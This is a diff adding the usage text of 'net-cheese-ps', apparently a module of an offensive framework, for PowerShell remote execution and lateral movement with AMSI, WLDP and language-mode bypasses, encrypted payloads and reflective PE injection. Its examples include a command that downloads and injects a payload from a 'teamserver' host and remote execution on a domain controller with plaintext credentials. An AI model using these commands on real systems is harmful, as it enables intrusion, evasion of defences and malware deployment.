@@ -1,0 +1,49 @@
+ABOUT
+    PowerShell command execution and lateral movement framework using
+    System.Management.Automation.PowerShell. Supports local and remote execution via
+    WS Management with built in CLM, AMSI, and WLDP bypasses, module import, encrypted
+    payloads, and reflective PE injection. If executed without a target, runs locally.
+    Must run as a privileged user when using PowerShell Remoting.
+
+USAGE:
+    net-cheese-ps --- [options]
+
+ARGUMENTS:
+    -t, --target=VALUE         Target machine
+    -c, --code=VALUE           Code to execute
+    -e, --encoded              Indicates that provided code is base64 encoded
+    -a, --am-si-bypass=VALUE   PowerShell script to bypass AMSI (fs, smb, or http[s])
+    --aX, --encrypted-am-si    Indicates that provided AMSI bypass is encrypted
+    -i, --import=VALUE         Import additional PowerShell modules (fs, smb, or http[s])
+    --iX, --encrypted-imports  Indicates that provided modules are encrypted
+    -o, --outstring            Append Out-String to code
+    -r, --redirect             Redirect stderr to stdout
+    -d, --domain=VALUE         Domain for alternate credentials
+    -u, --username=VALUE       Username for alternate credentials
+    -p, --password=VALUE       Password for alternate credentials
+    -X, --encrypt=VALUE        Encrypt a script with a hardcoded key
+    -D, --decrypt=VALUE        Test decryption of a script with a hardcoded key
+    -n, --skip-bypass=VALUE    Skip AMSI (A), WLDP (W), or ALL (*) bypass techniques
+    -l, --lockdown-escape      Enable PowerShell FullLanguage mode using REGINI
+    -w, --wldp-bypass=VALUE    PowerShell script to bypass WLDP (fs, smb, or http[s])
+    --wX, --encrypted-wldp     Indicates that provided WLDP bypass is encrypted
+    -x, --executable=VALUE     Download and execute given executable
+    --xX, --encrypted-executable  Indicates that provided Exe/DLL is encrypted
+    --xCS, --executable-csharp Indicates that the executable is C# (.NET)
+    -R, --reflective-injection Use Invoke-ReflectivePEInjection (requires import)
+    -P, --powershell-decrypt   Force PowerShell based decryption
+    -k, --encryption-key=VALUE Key for encryption/decryption
+    --ssl                      Force use of SSL
+
+EXAMPLES:
+    net-cheese-ps --- -c "whoami"
+    net-cheese-ps --- -t DC01 -c "hostname" -u DOMAIN\admin -p Password123
+    net-cheese-ps --- -c "<base64>" -e
+    net-cheese-ps --- -x http://teamserver/payload.exe -R -i http://teamserver/Invoke-ReflectivePEInjection.ps1
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-cheese-ps -w 60 --- -c "whoami"
